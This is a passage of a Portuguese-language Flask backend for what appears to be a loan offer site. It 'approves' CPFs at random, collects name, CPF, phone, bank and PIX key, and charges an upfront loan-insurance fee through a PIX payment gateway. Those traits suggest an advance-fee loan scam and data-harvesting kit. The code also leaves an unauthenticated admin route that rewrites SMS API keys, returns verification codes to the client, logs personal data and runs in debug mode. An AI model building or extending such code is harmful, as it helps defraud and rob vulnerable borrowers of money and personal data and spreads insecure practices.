    return render_template('input_cpf.html')

@app.route('/analisar-cpf')
@check_referer
def analisar_cpf():
    try:
        # Obter o CPF da query string
        cpf = request.args.get('cpf')
        
        if not cpf:
            return redirect('/input-cpf')
        
        # Remover qualquer caractere não-numérico
        cpf_digits = re.sub(r'\D', '', cpf)
        
        # Verificar se o CPF tem 11 dígitos
        if len(cpf_digits) != 11:
            return render_template('analysis_result.html', 
                                  valid=False, 
                                  message='CPF inválido. Deve conter 11 dígitos.')
        
        # Verificar se todos os dígitos são iguais (CPF inválido)
        if len(set(cpf_digits)) == 1:
            return render_template('analysis_result.html', 
                                  valid=False, 
                                  message='CPF inválido. Todos os dígitos são iguais.')
        
        # Simular análise (aprovação aleatória para demonstração)
        probability_approved = 0.75  # 75% de chance de aprovação
        is_approved = random.random() < probability_approved
        
        # Preparar os dados para o template
        loan_amounts = [3000, 5000, 8000, 10000, 15000] if is_approved else []
        
        return render_template('analysis_result.html', 
                              valid=True,
                              cpf=format_cpf(cpf),
                              approved=is_approved,
                              amounts=loan_amounts,
                              message='CPF aprovado para empréstimo!' if is_approved else 'CPF não elegível no momento.')
        
    except Exception as e:
        app.logger.error(f"Erro ao analisar CPF: {str(e)}")
        return render_template('error.html', message='Erro ao processar a solicitação.')

@app.route('/opcoes-emprestimo')
@check_referer
def opcoes_emprestimo():
    try:
        # Obter parâmetros da query string
        cpf = request.args.get('cpf')
        nome = request.args.get('nome')
        amount = request.args.get('amount')
        
        # Verificar se temos os dados necessários
        if not cpf or not amount:
            return redirect('/input-cpf')
        
        # Converter o valor para float
        try:
            loan_amount = float(amount)
        except:
            loan_amount = 5000  # Valor padrão se a conversão falhar
        
        # Calcular opções de parcelas
        term_options = [12, 24, 36, 48, 60]
        installment_options = []
        
        # Taxa de juros simulada (1.5% ao mês)
        monthly_interest_rate = 0.015
        
        for term in term_options:
            # Cálculo do valor da parcela usando a fórmula de amortização
            monthly_payment = loan_amount * (monthly_interest_rate * (1 + monthly_interest_rate) ** term) / ((1 + monthly_interest_rate) ** term - 1)
            
            installment_options.append({
                'term': term,
                'monthly_payment': round(monthly_payment, 2),
                'total_amount': round(monthly_payment * term, 2)
            })
        
        return render_template('loan_options.html', 
                              cpf=format_cpf(cpf),
                              nome=nome,
                              amount=loan_amount,
                              options=installment_options)
        
    except Exception as e:
        app.logger.error(f"Erro ao exibir opções de empréstimo: {str(e)}")
        return render_template('error.html', message='Erro ao processar a solicitação.')

@app.route('/seguro-prestamista')
@check_referer
def seguro_prestamista():
    try:
        # Obter parâmetros da query string
        cpf = request.args.get('cpf')
        nome = request.args.get('nome')
        amount = request.args.get('amount')
        term = request.args.get('term')
        monthly = request.args.get('monthly')
        
        # Verificar se temos os dados necessários
        if not cpf or not amount or not term or not monthly:
            return redirect('/opcoes-emprestimo')
        
        # Converter valores para números
        try:
            loan_amount = float(amount)
            loan_term = int(term)
            monthly_payment = float(monthly)
        except:
            # Valores padrão se a conversão falhar
            loan_amount = 5000
            loan_term = 24
            monthly_payment = 250
        
        # Calcular valor do seguro (simulação)
        insurance_rate = 0.0035  # 0.35% do valor do empréstimo
        insurance_amount = round(loan_amount * insurance_rate, 2)
        
        return render_template('loan_insurance.html', 
                              cpf=format_cpf(cpf),
                              nome=nome,
                              amount=loan_amount,
                              term=loan_term,
                              monthly=monthly_payment,
                              insurance=insurance_amount)
        
    except Exception as e:
        app.logger.error(f"Erro ao exibir seguro prestamista: {str(e)}")
        return render_template('error.html', message='Erro ao processar a solicitação.')

@app.route('/obrigado')
@check_referer
def thank_you():
    try:
        # Obter parâmetros da query string
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        bank = request.args.get('bank', '')
        pix_key = request.args.get('pix_key', '')
        loan_amount = request.args.get('loan_amount', '')
        
        # Preparar dados para o template
        user_data = {
            'nome': nome,
            'cpf': cpf,
            'phone': phone,
            'bank': bank,
            'pix_key': pix_key,
            'loan_amount': loan_amount
        }
        
        # Log de dados recebidos para debug
        app.logger.info(f"[PROD] Página de agradecimento acessada com dados: {user_data}")
        
        # Renderizar o template com os dados do usuário
        return render_template('thank_you.html', user=user_data)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de agradecimento: {str(e)}")
        return jsonify({'error': 'Erro ao processar a solicitação'}), 500

@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    """
    Endpoint para criar um pagamento PIX diretamente
    """
    try:
        # Obter dados do corpo da requisição
        data = request.json
        
        if not data:
            return jsonify({"error": "Dados não fornecidos"}), 400
        
        required_fields = ['name', 'cpf', 'amount']
        missing_fields = [field for field in required_fields if field not in data]
        
        if missing_fields:
            return jsonify({"error": f"Campos obrigatórios ausentes: {', '.join(missing_fields)}"}), 400
        
        # Inicializar a API de pagamento
        api = get_payment_gateway()
        
        # Criar o pagamento PIX
        result = api.create_pix_payment(data)
        
        # Log do resultado
        app.logger.info(f"PIX payment created: {result}")
        
        return jsonify(result)
        
    except Exception as e:
        app.logger.error(f"Error creating PIX payment: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/check-for4payments-status', methods=['GET', 'POST'])
@check_referer
def check_for4payments_status():
    """
    Endpoint para verificar o status de um pagamento For4Payments
    """
    try:
        # Obter o ID da transação
        if request.method == 'POST':
            data = request.json
            transaction_id = data.get('transaction_id')
        else:
            transaction_id = request.args.get('transaction_id')
        
        if not transaction_id:
            return jsonify({"error": "ID da transação não fornecido"}), 400
        
        # Inicializar a API de pagamento
        api = create_for4payments_api()
        
        # Verificar o status do pagamento
        result = api.check_payment_status(transaction_id)
        
        # Log do resultado
        app.logger.info(f"For4Payments status checked: {result}")
        
        # Estruturar a resposta
        status_result = {
            "original_status": result.get('status', 'UNKNOWN'),
            "transaction_id": transaction_id
        }
        
        return jsonify(status_result)
        
    except Exception as e:
        app.logger.error(f"Error checking For4Payments status: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/send-verification-code', methods=['POST'])
@check_referer
def send_verification_code_route():
    """
    Endpoint para enviar código de verificação via SMS
    """
    try:
        # Obter o número de telefone da requisição
        data = request.json
        phone_number = data.get('phone')
        
        if not phone_number:
            return jsonify({"success": False, "message": "Número de telefone não fornecido"}), 400
        
        # Enviar o código de verificação
        success, result = send_verification_code(phone_number)
        
        if success:
            # Se for bem-sucedido, result conterá o código de verificação
            verification_code = result
            
            # Resposta para o cliente (em produção, não enviamos o código de volta)
            response = {
                "success": True,
                "message": "Código de verificação enviado com sucesso",
                "verification_code": verification_code  # Remover esta linha em produção
            }
            
            app.logger.info(f"Código de verificação enviado para {phone_number}: {verification_code}")
            
            return jsonify(response)
        else:
            # Se falhar, result conterá a mensagem de erro
            error_message = result
            
            app.logger.error(f"Falha ao enviar código de verificação para {phone_number}: {error_message}")
            
            return jsonify({
                "success": False,
                "message": f"Falha ao enviar o código de verificação: {error_message}"
            }), 500
            
    except Exception as e:
        app.logger.error(f"Erro ao enviar código de verificação: {str(e)}")
        return jsonify({"success": False, "message": f"Erro ao processar a solicitação: {str(e)}"}), 500

@app.route('/atualizar-cadastro')
@check_referer
def atualizar_cadastro():
    """
    Página para atualização de cadastro com verificação por SMS
    """
    try:
        # Obter parâmetros da query string
        cpf = request.args.get('cpf', '')
        nome = request.args.get('nome', '')
        phone = request.args.get('phone', '')
        
        return render_template('update_registration.html', 
                             cpf=cpf,
                             nome=nome,
                             phone=phone)
    except Exception as e:
        app.logger.error(f"Erro ao carregar página de atualização de cadastro: {str(e)}")
        return jsonify({'error': 'Erro ao processar a solicitação'}), 500

@app.route('/sms-config')
def sms_config():
    """
    Interface administrativa para configuração das APIs de SMS
    """
    # Obter as configurações atuais
    sms_api = os.environ.get('SMS_API', 'smsdev')
    smsdev_api_key = os.environ.get('SMSDEV_API_KEY', 'Não configurado')
    owen_api_key = os.environ.get('OWEN_API_KEY', 'Não configurado')
    
    # Mascarar as chaves para segurança
    if smsdev_api_key != 'Não configurado':
        prefix = smsdev_api_key[:4]
        suffix = smsdev_api_key[-4:]
        masked_smsdev_key = f"{prefix}{'*' * (len(smsdev_api_key) - 8)}{suffix}"
    else:
        masked_smsdev_key = smsdev_api_key
        
    if owen_api_key != 'Não configurado':
        prefix = owen_api_key[:4]
        suffix = owen_api_key[-4:]
        masked_owen_key = f"{prefix}{'*' * (len(owen_api_key) - 8)}{suffix}"
    else:
        masked_owen_key = owen_api_key
    
    return render_template('sms_config.html', 
                          sms_api=sms_api,
                          smsdev_api_key=masked_smsdev_key,
                          owen_api_key=masked_owen_key)

@app.route('/update-sms-config', methods=['POST'])
def update_sms_config():
    """
    Processa a atualização das configurações de SMS
    """
    try:
        # Obter os dados do formulário
        sms_api = request.form.get('sms_api', 'smsdev')
        smsdev_api_key = request.form.get('smsdev_api_key', '')
        owen_api_key = request.form.get('owen_api_key', '')
        
        # Atualizar as variáveis de ambiente (temporariamente, até o servidor reiniciar)
        os.environ['SMS_API'] = sms_api
        
        # Atualizar as chaves da API apenas se forem fornecidas (não enviar campos vazios)
        if smsdev_api_key:
            os.environ['SMSDEV_API_KEY'] = smsdev_api_key
            
        if owen_api_key:
            os.environ['OWEN_API_KEY'] = owen_api_key
        
        # Log das alterações
        app.logger.info(f"Configurações de SMS atualizadas. API selecionada: {sms_api}")
        
        # Redirecionar de volta à página de configuração com mensagem de sucesso
        return render_template('sms_config.html', 
                            sms_api=sms_api,
                            smsdev_api_key='******', # Mascarar as chaves por segurança
                            owen_api_key='******',
                            message="Configurações atualizadas com sucesso!")
        
    except Exception as e:
        app.logger.error(f"Erro ao atualizar configurações de SMS: {str(e)}")
        
        # Redirecionar de volta à página de configuração com mensagem de erro
        return render_template('sms_config.html', 
                            sms_api=os.environ.get('SMS_API', 'smsdev'),
                            smsdev_api_key='******',
                            owen_api_key='******',
                            error=f"Erro ao atualizar configurações: {str(e)}")

@app.route('/send-test-sms', methods=['POST'])
def send_test_sms():
    """
    Envia um SMS de teste usando a API configurada
    """
    try:
        # Obter os dados do formulário
        phone_number = request.form.get('phone_number', '')
        
        if not phone_number:
            return jsonify({"success": False, "message": "Número de telefone não fornecido"}), 400
        
        # Formatar o número de telefone (remover caracteres não numéricos)
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        # Verificar se o telefone tem o número correto de dígitos (11 para Brasil: DDD + número)
        if len(formatted_phone) != 11:
            return jsonify({"success": False, "message": "Formato de telefone inválido. Deve conter 11 dígitos (DDD + número)."}), 400
        
        # Mensagem de teste
        message = f"Este é um SMS de teste enviado em {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}. Sistema funcionando corretamente!"
        
        # Selecionar a API de SMS com base na configuração
        sms_api = os.environ.get('SMS_API', 'smsdev').lower()
        
        if sms_api == 'owen':
            success = send_sms_owen(phone_number, message)
        else:  # Default: smsdev
            success = send_sms_smsdev(phone_number, message)
        
        if success:
            app.logger.info(f"SMS de teste enviado com sucesso para {phone_number} via {sms_api.upper()}")
            return jsonify({"success": True, "message": f"SMS de teste enviado com sucesso para {phone_number} via {sms_api.upper()}"})
        else:
            app.logger.error(f"Falha ao enviar SMS de teste para {phone_number} via {sms_api.upper()}")
            return jsonify({"success": False, "message": f"Falha ao enviar SMS de teste para {phone_number} via {sms_api.upper()}"}), 500
            
    except Exception as e:
        app.logger.error(f"Erro ao enviar SMS de teste: {str(e)}")
        return jsonify({"success": False, "message": f"Erro ao enviar SMS de teste: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)